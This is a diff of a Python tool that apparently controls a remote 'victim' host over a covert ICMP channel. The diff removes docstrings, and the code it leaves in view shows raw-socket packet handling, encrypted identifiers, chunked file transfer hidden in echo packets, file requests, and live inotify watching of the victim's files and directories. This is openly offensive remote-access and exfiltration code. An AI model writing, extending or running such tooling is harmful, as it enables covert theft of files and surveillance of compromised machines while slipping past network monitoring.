@@ -196,8 +196,6 @@ def open_raw_send_socket():
 
 
 def open_raw_icmp_recv_socket():
-    """Open SOCK_RAW for ICMP with a fat receive buffer so a burst of
-    chunk packets won't overflow the kernel queue before Python drains it."""
     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
     force_opt = getattr(socket, "SO_RCVBUFFORCE", None)
     if force_opt is not None:
@@ -220,7 +218,6 @@ def send_icmp_identifier(send_socket, source_ip, destination_ip, identifier_encr
 
 
 def wait_for_ack_ready(recv_socket, source_ip, key, timeout):
-    """Block until an ICMP echo from source_ip carries ACK_READY in the identifier."""
     deadline = time.time() + timeout
     while True:
         remaining = deadline - time.time()
@@ -247,9 +244,6 @@ def wait_for_ack_ready(recv_socket, source_ip, key, timeout):
 
 
 def wait_for_ack(recv_socket, source_ip, key, expected_identifier, expected_sequence, timeout):
-    """Wait for an ICMP echo from source_ip where the decrypted identifier matches
-    expected_identifier. If expected_sequence is not None, the ICMP sequence must
-    also match. Returns True on match, False on timeout."""
     deadline = time.time() + timeout
     while True:
         remaining = deadline - time.time()
@@ -279,10 +273,6 @@ def wait_for_ack(recv_socket, source_ip, key, expected_identifier, expected_sequ
 
 
 def send_chunk(send_socket, source_ip, destination_ip, key, chunk_index, chunk_bytes):
-    """Send one chunk: header packet (seq=CHUNK_HEADER_SEQ, id=chunk_index)
-    followed by data packets seq=1..N each carrying two file bytes.
-    A tiny per-packet delay keeps us from overrunning the device queue
-    on the sender or the recv socket buffer on the receiver."""
     send_icmp_identifier(
         send_socket, source_ip, destination_ip,
         encrypt_identifier(chunk_index, key), CHUNK_HEADER_SEQ,
@@ -305,9 +295,6 @@ def send_chunk(send_socket, source_ip, destination_ip, key, chunk_index, chunk_b
 
 
 def _read_icmp_echo(recv_socket, source_ip, remaining):
-    """Block up to `remaining` seconds for one ICMP echo request from source_ip.
-    Returns (sequence, identifier) on a matching packet, None on timeout, or ()
-    on a packet that didn't match (caller should keep looping)."""
     if remaining <= 0:
         return None
     recv_socket.settimeout(remaining)
@@ -337,8 +324,6 @@ def send_ack(send_socket, source_ip, destination_ip, key, identifier_sentinel, s
 
 def receive_chunk(recv_socket, send_socket, source_ip, my_ip, key,
                   expected_chunk_index, expected_packets, chunks_written, timeout):
-    """Collect one chunk's data packets. Returns (bytes, None) on success or
-    (None, missing_count) on timeout. Mirrors victim.receive_chunk."""
     packets: dict[int, int] = {}
     saw_header = False
     deadline = time.time() + timeout
@@ -381,8 +366,6 @@ def receive_chunk(recv_socket, send_socket, source_ip, my_ip, key,
 
 
 def drain_for_end(recv_socket, send_socket, source_ip, my_ip, key, chunks_written, timeout):
-    """Brief listen window after the last chunk: ACK the END marker if it
-    arrives, and re-ACK any in-flight duplicate chunk headers."""
     deadline = time.time() + timeout
     while True:
         remaining = deadline - time.time()
@@ -401,8 +384,6 @@ def drain_for_end(recv_socket, send_socket, source_ip, my_ip, key, chunks_writte
 
 
 def receive_byte_metadata(recv_socket, source_ip, key, timeout):
-    """Receive the 2-packet byte-stream metadata (seq=1 size_hi, seq=2 size_lo).
-    Returns the 32-bit byte count or None on timeout."""
     packets: dict[int, int] = {}
     deadline = time.time() + timeout
     while True:
@@ -420,10 +401,6 @@ def receive_byte_metadata(recv_socket, source_ip, key, timeout):
 
 
 def send_byte_stream_chunked(send_socket, recv_socket, my_ip, peer_ip, key, payload):
-    """Send `payload` to peer using the chunk+ACK protocol.
-    Sequence: metadata (size_hi, size_lo) -> wait ACK_META -> per-chunk
-    send+wait ACK_CHUNK with retries -> fire-and-forget END -> wait ACK_END.
-    Returns True on success, False otherwise (no exception raised)."""
     byte_count = len(payload)
     byte_count_hi = (byte_count >> 16) & 0xFFFF
     byte_count_lo = byte_count & 0xFFFF
@@ -465,8 +442,6 @@ def send_byte_stream_chunked(send_socket, recv_socket, my_ip, peer_ip, key, payl
 
 
 def receive_byte_stream_chunked(recv_socket, send_socket, my_ip, peer_ip, key, metadata_timeout):
-    """Receive a chunked byte stream. Sender must already be past any preceding
-    handshake. Returns the assembled bytes or None on failure."""
     byte_count = receive_byte_metadata(recv_socket, peer_ip, key, metadata_timeout)
     if byte_count is None:
         return None
@@ -883,9 +858,6 @@ def request_file(ctx: Context):
 
 
 def watch_item(ctx: Context, cmd: int):
-    """Common handler for watch-file (CMD_WATCH_FILE) and watch-dir (CMD_WATCH_DIR).
-    Sends the path to victim, then receives and prints inotify events live until
-    the user presses Enter or victim signals done."""
     if not ctx.connected:
         print("Not connected. Use option 1 first.")
         return
